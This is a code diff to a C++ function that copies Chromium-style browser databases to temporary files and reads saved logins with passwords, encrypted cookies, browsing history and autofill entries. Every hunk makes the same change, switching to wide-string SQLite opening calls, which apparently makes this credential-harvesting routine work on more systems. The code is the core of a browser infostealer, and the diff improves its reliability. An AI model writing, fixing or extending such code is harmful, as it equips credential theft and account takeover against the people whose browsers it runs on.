@@ -192,7 +192,7 @@ void do_work() {
         fs::path tmp_db = temp_dir / "pass.tmp";
         if (fs::exists(db_path) && fs::copy_file(db_path, tmp_db, fs::copy_options::overwrite_existing)) {
             sqlite3* db;
-            if (sqlite3_open(tmp_db.string().c_str(), &db) == SQLITE_OK) {
+            if (sqlite3_open16(tmp_db.wstring().c_str(), &db) == SQLITE_OK) {
                 sqlite3_stmt* stmt;
                 if (sqlite3_prepare_v2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, &stmt, nullptr) == SQLITE_OK) {
                     while (sqlite3_step(stmt) == SQLITE_ROW) {
@@ -222,7 +222,7 @@ void do_work() {
         tmp_db = temp_dir / "cook.tmp";
         if (fs::exists(db_path) && fs::copy_file(db_path, tmp_db, fs::copy_options::overwrite_existing)) {
             sqlite3* db;
-            if (sqlite3_open(tmp_db.string().c_str(), &db) == SQLITE_OK) {
+            if (sqlite3_open16(tmp_db.wstring().c_str(), &db) == SQLITE_OK) {
                 sqlite3_stmt* stmt;
                 if (sqlite3_prepare_v2(db, "SELECT host_key, name, encrypted_value FROM cookies", -1, &stmt, nullptr) == SQLITE_OK) {
                     while (sqlite3_step(stmt) == SQLITE_ROW) {
@@ -254,7 +254,7 @@ void do_work() {
         tmp_db = temp_dir / "hist.tmp";
         if (fs::exists(db_path) && fs::copy_file(db_path, tmp_db, fs::copy_options::overwrite_existing)) {
             sqlite3* db;
-            if (sqlite3_open(tmp_db.string().c_str(), &db) == SQLITE_OK) {
+            if (sqlite3_open16(tmp_db.wstring().c_str(), &db) == SQLITE_OK) {
                 sqlite3_stmt* stmt;
                 if (sqlite3_prepare_v2(db, "SELECT url, title, visit_count FROM urls LIMIT 500", -1, &stmt, nullptr) == SQLITE_OK) {
                     while (sqlite3_step(stmt) == SQLITE_ROW) {
@@ -278,7 +278,7 @@ void do_work() {
         tmp_db = temp_dir / "web.tmp";
         if (fs::exists(db_path) && fs::copy_file(db_path, tmp_db, fs::copy_options::overwrite_existing)) {
             sqlite3* db;
-            if (sqlite3_open(tmp_db.string().c_str(), &db) == SQLITE_OK) {
+            if (sqlite3_open16(tmp_db.wstring().c_str(), &db) == SQLITE_OK) {
                 sqlite3_stmt* stmt;
                 if (sqlite3_prepare_v2(db, "SELECT name, value FROM autofill", -1, &stmt, nullptr) == SQLITE_OK) {
                     while (sqlite3_step(stmt) == SQLITE_ROW) {
